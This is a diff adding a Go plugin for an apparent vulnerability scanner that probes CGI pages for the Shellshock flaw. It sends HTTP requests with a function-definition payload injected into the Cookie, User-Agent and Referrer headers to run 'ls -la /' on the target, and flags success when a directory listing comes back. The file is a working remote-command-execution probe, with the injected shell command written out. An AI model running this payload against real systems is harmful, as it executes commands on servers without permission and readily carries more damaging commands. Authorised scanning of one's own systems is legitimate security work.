@@ -1,0 +1,71 @@
+package goplugin
+
+import (
+	"net/http"
+	"strings"
+	"vuldb/common"
+	"vuldb/plugin"
+)
+
+type shellShock struct {
+	info   common.PluginInfo
+	result []common.PluginInfo
+}
+
+func init() {
+	plugin.Regist("web", &shellShock{})
+}
+func (d *shellShock) Init() common.PluginInfo{
+	d.info = common.PluginInfo{
+		Name:    "shellshock 破壳漏洞",
+		Remarks: "攻击者可利用此漏洞改变或绕过环境限制，以执行任意的shell命令,最终完全控制目标系统",
+		Level:   0,
+		Type:    "RCE",
+		Author:   "wolf",
+		References: common.References{
+			URL: "",
+			CVE: "",
+		},
+	}
+	return d.info
+}
+func (d *shellShock) GetResult() []common.PluginInfo {
+	return d.result
+}
+func (d *shellShock) Check(URL string, meta plugin.TaskMeta) bool {
+	if meta.System == "windows" {
+		return false
+	}
+	var checkURL string
+	for _, url := range meta.FileList {
+		if strings.Contains(url, ".cgi") {
+			checkURL = url
+			break
+		}
+	}
+	if checkURL == "" {
+		return false
+	}
+	pocList := []string{
+		"() { :;};echo ; echo; echo $(/bin/ls -la /);",
+		// "{() { _; } >_[$($())] { /bin/expr 32001611 - 100; }}",
+	}
+	for _, poc := range pocList {
+		request, err := http.NewRequest("GET", checkURL, nil)
+		request.Header.Set("cookie", poc)
+		request.Header.Set("User-Agent", poc)
+		request.Header.Set("Referrer", poc)
+		resp, err := common.RequestDo(request, true)
+		if err != nil {
+			return false
+		}
+		if strings.Contains(resp.ResponseRaw, "drwxr-xr-x") && strings.Contains(resp.ResponseRaw, "etc") {
+			result := d.info
+			result.Response = resp.ResponseRaw
+			result.Request = resp.RequestRaw
+			d.result = append(d.result, result)
+			return true
+		}
+	}
+	return false
+}
